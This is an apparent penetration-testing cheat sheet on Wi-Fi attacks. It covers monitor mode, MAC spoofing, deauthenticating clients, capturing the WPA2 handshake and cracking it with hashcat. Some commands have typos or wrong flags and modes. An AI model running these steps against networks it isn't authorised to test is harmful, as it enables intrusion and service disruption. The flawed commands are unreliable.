# WiFi

## Monitor mode
Either:   
```
airmon-ng start wlan0
```

Or:  
```
ifconfig wlan0 down
iwconf wlan0 mode monitor
ifconfig wlan0 up
```


## Capture frames
`airodump-ng wlan0mon`

## Capture MAC addresses
To capture the MAC address of clients who have authenticated to the AP:  

`airodump-ng -c <channel> -a -bssid <bssid>`

Where:   
`<channel>` - The Channel that the AP is broadcasting on   
`<bssid>`   - The BSSID of the AP

## Spoof MAC address
Once a MAC address has been determined, the local MAC can be changed. First you need to take down the local adapter:

`ifconfig wlan0 down`

Then you can use `macchanger` to change the MAC address to match the one you captured:

`macchanger -m <mac> wlan0`

Finally, bring the interface back up:

`ifconfig wlan0 up`

## Attacking WPA2-PSK
WPA2-PSK is the most widely used protocol used for securing Wi-Fi, although WPA3 is starting to gain popularity.

To crack WPA2-PSK, the hash of the password must be captured and then cracked offline using a tool like `hashcat`. This passord hash can be captured by sniffing the network traffic until the client sends it to the AP, this can either be done stealthily by waiting or by forcing the client to disconnect from the AP.

The first step is to put the wireless adapter into [monitor mode](#monitor-mode) and then running:

`airodump-ng -bssid <BSSID> -c <channel> --write <file> wlan0mon`

where:   
`<BSSID>`    - The BSSID of the Target AP   
`<channel`   - The Channel the AP is transmitting on   
`<file>`     - A filename used to store the captured handshake   

### Forcing a client to reconnect
If you don't want to wait for a client to connect to capture the password hash, you can force an already connected client to disconnect from the AP. This will cause the client to reconnect, and you can quickly capture the hash:

`aireplay-ng -deauth 100 -a <BSSID> wlan0mon`

where:   
`-deauth 100` - Send 100 deauth frames to the AP   
`<BSSID>`     - The BSSID of the target AP

When the client reconnects, the four way handshake will be captured.

```
CH 11 ][ Elapsed:  3 hours 15 minutes  ][ 2023-02-05 10:27 ] [  WPA Handshake:  12:09:27:00:18:21
```

### Brute force
Now that you have the handshake, you can use a cracking program like `hashcat` to brute-force the password. This can either be done using a dictionary, or by iterating through a series of values.

`hashcat -m 16800 file.cap /user/share/dictionary/passwords.txt`



## Attacking WPS


